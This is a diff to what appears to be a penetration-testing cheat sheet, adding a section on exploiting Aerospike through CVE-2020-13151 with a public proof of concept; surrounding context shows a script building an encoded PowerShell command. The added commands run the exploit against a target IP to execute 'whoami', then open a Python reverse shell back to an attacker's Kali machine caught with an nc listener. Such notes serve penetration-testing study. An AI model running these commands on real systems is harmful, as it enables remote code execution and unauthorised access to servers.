@@ -2439,6 +2439,22 @@ cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decod
 
 print(cmdline)
 ```
+# Public Exploit
+
+<aside>
+💡 Public exploits used Windows and Linux 
+</aside>
+### Aerospike
+- Aerospike port 3000 is widely used in real-time bidding, fraud detection, recommendation engines, and profile management. [Github](https://github.com/b4ny4n/CVE-2020-13151)
+- Should download the <strong> poc.lua </strong>strong> to work, match the version of aerospike, Install with (sudo pip3 install aerospike)
+- Try with basic commands ls, pwd, whoami below example
+```bash
+python3 cve2020-13151.py --ahost 192.168.162.143 --cmd "whoami" #aero
+#once above command is working start woith reverse shell
+python3 cve2020-13151.py --ahost 192.168.162.143 --pythonshell --lport 3003 --lhost <Kali-Ip>
+rlwrap nc -nlvp 3003 # This case used open port on the target
+
+```
 
 # Special Thanks to the Creator of tools and Community
 [![](https://github.com/samratashok.png?size=50)](https://github.com/samratashok)
